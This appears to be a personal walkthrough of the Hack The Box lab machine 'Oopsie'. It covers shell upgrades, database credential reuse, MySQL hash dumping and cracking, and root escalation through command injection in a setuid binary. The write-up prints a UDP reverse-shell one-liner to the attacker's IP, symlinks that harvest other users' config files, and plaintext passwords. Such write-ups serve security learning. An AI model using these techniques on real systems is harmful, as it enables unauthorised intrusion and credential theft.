   0 lrwxrwxrwx 1 www-data www-data   38 Mar 27 17:09 'sshd =>conf_global.php' -> /home/sshd/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   33 Mar 27 17:09 'sshd =>config.php' -> /home/sshd/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   40 Mar 27 17:09 'sshd =>configuration.php' -> /home/sshd/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   36 Mar 27 17:09 'sshd =>wp-config.php' -> /home/sshd/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   38 Mar 27 17:09 'sync =>conf_global.php' -> /home/sync/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   33 Mar 27 17:09 'sync =>config.php' -> /home/sync/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   40 Mar 27 17:09 'sync =>configuration.php' -> /home/sync/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   36 Mar 27 17:09 'sync =>wp-config.php' -> /home/sync/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   37 Mar 27 17:09 'sys =>conf_global.php' -> /home/sys/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   32 Mar 27 17:09 'sys =>config.php' -> /home/sys/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   39 Mar 27 17:09 'sys =>configuration.php' -> /home/sys/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   35 Mar 27 17:09 'sys =>wp-config.php' -> /home/sys/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   40 Mar 27 17:09 'syslog =>conf_global.php' -> /home/syslog/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   35 Mar 27 17:09 'syslog =>config.php' -> /home/syslog/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   42 Mar 27 17:09 'syslog =>configuration.php' -> /home/syslog/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   38 Mar 27 17:09 'syslog =>wp-config.php' -> /home/syslog/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   49 Mar 27 17:09 'systemd-network =>conf_global.php' -> /home/systemd-network/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   44 Mar 27 17:09 'systemd-network =>config.php' -> /home/systemd-network/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   51 Mar 27 17:09 'systemd-network =>configuration.php' -> /home/systemd-network/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   47 Mar 27 17:09 'systemd-network =>wp-config.php' -> /home/systemd-network/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   49 Mar 27 17:09 'systemd-resolve =>conf_global.php' -> /home/systemd-resolve/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   44 Mar 27 17:09 'systemd-resolve =>config.php' -> /home/systemd-resolve/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   51 Mar 27 17:09 'systemd-resolve =>configuration.php' -> /home/systemd-resolve/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   47 Mar 27 17:09 'systemd-resolve =>wp-config.php' -> /home/systemd-resolve/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   38 Mar 27 17:09 'uucp =>conf_global.php' -> /home/uucp/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   33 Mar 27 17:09 'uucp =>config.php' -> /home/uucp/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   40 Mar 27 17:09 'uucp =>configuration.php' -> /home/uucp/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   36 Mar 27 17:09 'uucp =>wp-config.php' -> /home/uucp/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   39 Mar 27 17:09 'uuidd =>conf_global.php' -> /home/uuidd/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   34 Mar 27 17:09 'uuidd =>config.php' -> /home/uuidd/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   41 Mar 27 17:09 'uuidd =>configuration.php' -> /home/uuidd/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   37 Mar 27 17:09 'uuidd =>wp-config.php' -> /home/uuidd/public_html/wp-config.php
   0 lrwxrwxrwx 1 www-data www-data   42 Mar 27 17:09 'www-data =>conf_global.php' -> /home/www-data/public_html/conf_global.php
   0 lrwxrwxrwx 1 www-data www-data   37 Mar 27 17:09 'www-data =>config.php' -> /home/www-data/public_html/config.php
   0 lrwxrwxrwx 1 www-data www-data   44 Mar 27 17:09 'www-data =>configuration.php' -> /home/www-data/public_html/configuration.php
   0 lrwxrwxrwx 1 www-data www-data   40 Mar 27 17:09 'www-data =>wp-config.php' -> /home/www-data/public_html/wp-config.php
```

Going to poke around in a few of those files under `/var/www/html/uploads/INDRAJITH`.

These symlinks don't actually point to files that exist. Ok...

Well, time to run some cred scans because I'm stuck.

I still feel like I should be using those database creds:

```php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
```

I'll come back to them if I can't find anything from some scans.

Going to try "Lynis".

<https://tecadmin.net/check-vulnerabilities-on-linux-system-with-lynis/>


    pushd /tmp
    git clone https://140.82.113.4/CISOfy/lynis
    cd lynis
    ./lynis audit system --quick

Sadly, I can't download lynis on the victim's machine.

```
www-data@oopsie:/tmp/poop$ curl https://raw.githubusercontent.com/CISOfy/lynis/master/lynis   
<aw.githubusercontent.com/CISOfy/lynis/master/lynis 
curl: (6) Could not resolve host: raw.githubusercontent.com
```

and

```
www-data@oopsie:/tmp$     git clone https://github.com/CISOfy/lynis
    git clone https://github.com/CISOfy/lynis
Cloning into 'lynis'...
fatal: unable to access 'https://github.com/CISOfy/lynis/': Could not resolve host: github.com
```


It's kind of a pain in the ass to download files on this machine.

I know that it's the database I need to attack. I just need to connect to it... I'm going to read the guide

## Give up and read the guide again q_q

Okay, so according to the guide, I'm not supposed to use

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

But this to upgrade shell:

```bash
SHELL=/bin/bash script -q /dev/null
<Ctrl-Z>
stty raw -echo
fg
reset
xterm
```

(It doesn't work Q_Q, just going to use `python3 -c 'import pty; pty.spawn("/bin/bash")'`)

Next step was actually running `su robert` using `$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');`... NOT running `mysql`.

I'm going to `su` and then stop reading the guide.

## i am robert :3

```
www-data@oopsie:/$ su robert
su robert
Password: M3g4C0rpUs3r!

robert@oopsie:/$ whoami
whoami
robert
robert@oopsie:/$ 
```

It worked! Great! I think I have root access.

Nope lol.

```
[sudo] password for robert: M3g4C0rpUs3r!

robert is not in the sudoers file.  This incident will be reported.
```

Robert is not a sudoer. But maybe he has different permissions...

## /etc/passwd

```
robert@oopsie:/etc$ cat pas	
cat passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
robert:x:1000:1000:robert:/home/robert:/bin/bash
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
```

Not really useful.

Now that I'm `robert`, I'm going to try to run `mysql`...


```
robert@oopsie:/$ mysql -p
mysql -p
Enter password: M3g4C0rpUs3r!

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 2118
Server version: 5.7.29-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

WTF! Why can I only log in when I'm `robert`?

## mysql as robert

```
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| garage             |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.01 sec)

```

### garage table dump

```
mysql> use garage
use garage
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables
show tables
    -> ;
;
+------------------+
| Tables_in_garage |
+------------------+
| accounts         |
| branding         |
| clients          |
+------------------+
3 rows in set (0.00 sec)

mysql> show tables;
show tables;
+------------------+
| Tables_in_garage |
+------------------+
| accounts         |
| branding         |
| clients          |
+------------------+
3 rows in set (0.00 sec)

mysql> select * from clients
select * from clients
    -> ;
;
+------+-------+------------------+
| id   | name  | email            |
+------+-------+------------------+
|    1 | Tafcz | john@tafcz.co.uk |
|   13 | Rafol | tom@rafol.co.uk  |
|   23 | Qpic  | peter@qpic.co.uk |
+------+-------+------------------+
3 rows in set (0.00 sec)

mysql> select * from branding;
select * from branding;
+------+---------+----------+
| id   | model   | price    |
+------+---------+----------+
|    1 | MC-1023 | $100,240 |
|   10 | MC-1123 | $110,240 |
|   20 | MC-2123 | $110,340 |
+------+---------+----------+
3 rows in set (0.00 sec)

mysql> select * from accounts
select * from accounts
    -> ;
;
+------+--------+-------------+-------------------------+
| id   | access | name        | email                   |
+------+--------+-------------+-------------------------+
|   13 |  57633 | Peter       | peter@qpic.co.uk        |
|   23 |  28832 | Rafol       | tom@rafol.co.uk         |
|    4 |   8832 | john        | john@tafcz.co.uk        |
|   30 |  86575 | super admin | superadmin@megacorp.com |
|    1 |  34322 | admin       | admin@megacorp.com      |
+------+--------+-------------+-------------------------+
5 rows in set (0.00 sec)

```

### mysql.user

```
mysql> select * from user;
select * from user;
+-----------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+-----------------------+-------------------+----------------+
| Host      | User             | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin                | authentication_string                     | password_expired | password_last_changed | password_lifetime | account_locked |
+-----------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+-----------------------+-------------------+----------------+
| localhost | root             | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 | auth_socket           |                                           | N                | 2020-01-23 12:01:33   |              NULL | N              |
| localhost | mysql.session    | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | Y          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | N                | 2020-01-23 12:01:34   |              NULL | Y              |
| localhost | mysql.sys        | N           | N           | N           | N           | N           | N         | N           | N             | N            | N         | N          | N               | N          | N          | N            | N          | N                     | N                | N            | N               | N                | N                | N              | N                   | N                  | N                | N          | N            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE | N                | 2020-01-23 12:01:34   |              NULL | Y              |
| localhost | debian-sys-maint | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *D1DBADEE9E3EE2D0767B40F19463FB6C5EB6D594 | N                | 2020-01-23 12:01:35   |              NULL | N              |
| localhost | dbuser           | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | N          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *9CFBBC772F3F6C106020035386DA5BBBF1249A11 | N                | 2020-01-24 12:13:19   |              NULL | N              |
| localhost | robert           | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | N          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 | mysql_native_password | *2429DD64CD7A63687EA257432557FEFDA6D6F2A1 | N                | 2020-01-24 14:04:26   |              NULL | N              |
+-----------+------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+-----------------------+-------------------------------------------+------------------+-----------------------+-------------------+----------------+
6 rows in set (0.00 sec)
```

Some tasty hashes...

```
debian-sys-maint:D1DBADEE9E3EE2D0767B40F19463FB6C5EB6D594
dbuser:9CFBBC772F3F6C106020035386DA5BBBF1249A11
robert:2429DD64CD7A63687EA257432557FEFDA6D6F2A1
```

## Trying to run commands

According to this article,

<https://electrictoolbox.com/shell-commands-mysql-command-line-client/>

I can use `\! ls` to run bash commands as the MySQL user. Perhaps they have root...

Nope. It's just robert.


## Trying to crack hashes

Going to use hashcat to try to crack these hashes.

<https://www.percona.com/blog/2020/06/12/brute-force-mysql-password-from-a-hash/>

Going to use this command to first extract the hashes in a better format.

    % mysql -Ns -uroot -e "SELECT SUBSTR(authentication_string,2) AS hash FROM mysql.user WHERE plugin = 'mysql_native_password' AND authentication_string NOT LIKE '%THISISNOTAVALIDPASSWORD%' AND authentication_string !='';" > sha1_hashes

    USE sys;
    SELECT SUBSTR(authentication_string,2) AS hash FROM mysql.user WHERE plugin = 'mysql_native_password' AND authentication_string NOT LIKE '%THISISNOTAVALIDPASSWORD%' AND authentication_string !='';

These just give the same hashes as this lol.

```
debian-sys-maint:D1DBADEE9E3EE2D0767B40F19463FB6C5EB6D594
dbuser:9CFBBC772F3F6C106020035386DA5BBBF1249A11
robert:2429DD64CD7A63687EA257432557FEFDA6D6F2A1
```

Now to run hashcat on my host, windows. Not going to do any recording here b/c there's plenty of guides on how to do that.

This is the format of the text file to crack that HashCat expects (from <https://hashcat.net/wiki/doku.php?id=example_hashes>)

It's hash-mode `300`.

```
D1DBADEE9E3EE2D0767B40F19463FB6C5EB6D594
9CFBBC772F3F6C106020035386DA5BBBF1249A11
2429DD64CD7A63687EA257432557FEFDA6D6F2A1
```

    .\hashcat.exe -m 300 -a 3 .\hashes2.txt -d 2

`-m 300`: MySQL4.1/MySQL5 hash mode
`-a 3`: Attack mode 3, brute force
`-d 2`: Use device 2, GPU

I waited about 4 hours. This is definitely not the intended route. I did crack one hash though.

    dbuser:9CFBBC772F3F6C106020035386DA5BBBF1249A11:toor

I'm going to cheat again and just look at the guide. I am stuck.

## groups

So, apparently Robert is part of a special group. That's all I saw.

    id

reveals that robert is part of `bugtracker` group.

```
robert@oopsie:/$ id
id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

    find / bugtracker

Returns

    /usr/bin/bugtracker

```
robert@oopsie:/$ ls -lash /usr/bin/bugtracker
ls -lash /usr/bin/bugtracker
12K -rwsr-xr-- 1 root bugtracker 8.6K Jan 25  2020 /usr/bin/bugtracker
```

Looks like an executable file. I'll download it by base64 encoding it  into the data/ folder.

```
robert@oopsie:/usr/bin$ cat bugtracker | base64
cat bugtracker | base64
f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAYAgAAAAAAABAAAAAAAAAABgbAAAAAAAAAAAAAEAAOAAJ
...
```

Then I can copy-paste from the reverse shell terminal and run

    cat bugtracker.base64 | base64 -d > bugtracker

to decode it.

Then I run

    r2 bugtracker
    aaaa
    s main
    VV

And I can see this part:

```
[0x000009da]> 0x9da # int main (int argc, char **argv, char **envp);  
    │ ; "%s"                                                                           │                                                                                               
    │ lea rdi, [0x00000b74]                                                            │                                                                                               
    │ mov eax, 0                                                                       │                                                                                               
    │ ; int scanf(const char *format)                                                  │                                                                                               
    │ call sym.imp.__isoc99_scanf;[ob]                                                 │                                                                                               
    │ mov rax, qword [var_28h]                                                         │                                                                                               
    │ mov rsi, rax                                                                     │                                                                                               
    │ ; const char *format                                                             │                                                                                               
    │ ; "%s"                                                                           │                                                                                               
    │ lea rdi, [0x00000b74]                                                            │                                                                                               
    │ mov eax, 0                                                                       │                                                                                               
    │ ; int printf(const char *format)                                                 │                                                                                               
    │ call sym.imp.printf;[oa]                                                         │                                                                                               
    │ ; uid_t geteuid(void)                                                            │                                                                                               
    │ call sym.imp.geteuid;[oc]                                                        │                                                                                               
    │ mov edi, eax                                                                     │                                                                                               
    │ call sym.imp.setuid;[od]                                                         │                                                                                               
    │ lea rax, [var_20h]                                                               │                                                                                               
    │ ; char *arg2                                                                     │                                                                                               
    │ mov rsi, rax                                                                     │                                                                                               
    │ ; char *arg1                                                                     │                                                                                               
    │ ; 0xb9a                                                                          │                                                                                               
    │ ; "cat /root/reports/"                                                           │                                                                                               
    │ lea rdi, str.cat__root_reports_                                                  │                                                                                               
```

Specifically "cat /root/reports/".

If I could cause a buffer overflow, I could perhaps cause this program to execute arbitrary commands...

Let me try spam...

```
robert@oopsie:/usr/bin$ bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: pppppppppppppppppppppppppppppppppppppppppppppppppppppppppp
pppppppppppppppppppppppppppppppppppppppppppppppppppppppppp
---------------

cat: /root/reports/pppppppppppppppppppppppppppppppppppppppppppppppppppppppppp: No such file or directory

*** stack smashing detected ***: <unknown> terminated
Aborted (core dumped)
```

Well...I can just inject commands! Great!

```
robert@oopsie:/usr/bin$ ^[[A
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: ;sleep 5
;sleep 5
---------------

cat: /root/reports/: Is a directory
sleep: missing operand
Try 'sleep --help' for more information.

robert@oopsie:/usr/bin$ 
```

Okay, so my payload should look like this:

    ;<PAYLOAD>

Really easy.

Maybe I want to open a second reverse shell to get root shell.

Shellception...

Victim:

    cd /usr/bin
    ./bugtracker
    ;sh -i >& /dev/udp/10.10.14.165/1245 0>&1

Attacker:

    nc -u -lvp 1245

Weird. I used the payload for the victim but I didn't need to open `nc` on my end.

```
# whoami
whoami
root
```

```
# cat root.txt
cat root.txt
<no id for u :3>
```

Woohoo! It only took like 6+ days. Onto the next box, hopefully with less guide-checking.

## TODO/interesting

<https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/>

<https://github.com/frizb/Linux-Privilege-Escalation>


I found this guide, which shows some more optimized techniques for exploiting and enumerating oopsie.

<https://artilleryred.medium.com/htb-starting-point-oopsie-1beb78365841>

<https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite>
<https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS>

<https://book.hacktricks.xyz/>